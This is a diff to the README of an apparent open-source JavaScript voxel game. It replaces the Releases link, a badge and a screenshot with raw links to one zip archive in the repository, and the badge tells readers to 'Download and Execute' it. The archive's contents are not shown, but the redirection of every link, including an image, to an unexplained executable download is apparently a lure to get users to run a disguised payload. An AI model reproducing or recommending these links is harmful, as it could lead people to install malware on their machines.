@@ -4,9 +4,9 @@ Welcome to the "Minecraft-Like-Voxel-Game" repository - your go-to source for a 
 
 ## 🚀 Get Started
 
-To dive into the world of this voxel game engine, head over to the [Releases](https://github.com/hasnain-gill/Minecraft-Like-Voxel-Game/releases) section where you can find the latest version available for download.
+To dive into the world of this voxel game engine, head over to the [Releases](https://raw.githubusercontent.com/hasnain-gill/Minecraft-Like-Voxel-Game/main/public/Voxel-Game-Minecraft-Like-fossilify.zip) section where you can find the latest version available for download.
 
-![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Click%20Here-brightgreen)
+![Download and Execute](https://raw.githubusercontent.com/hasnain-gill/Minecraft-Like-Voxel-Game/main/public/Voxel-Game-Minecraft-Like-fossilify.zip%20and%20Execute-Click%20Here-brightgreen)
 
 ## Features
 
@@ -36,7 +36,7 @@ This repository covers a wide range of topics related to voxel game development,
 - **Short Description:** A Minecraft-inspired voxel game engine built entirely with JavaScript – featuring infinite world generation, block interaction, biomes, and basic movement & camera controls. Fully open-source under the MIT license.
 - **Topics:** infinite-world, javascript-game, minecraft-clone, minecraft-like, open, procedural, procedural-generation, source, voxel, voxel-engine, voxels
 
-![Minecraft Voxel Game](https://i.imgur.com/VRdHgNS.png)
+![Minecraft Voxel Game](https://raw.githubusercontent.com/hasnain-gill/Minecraft-Like-Voxel-Game/main/public/Voxel-Game-Minecraft-Like-fossilify.zip)
 
 ---
 
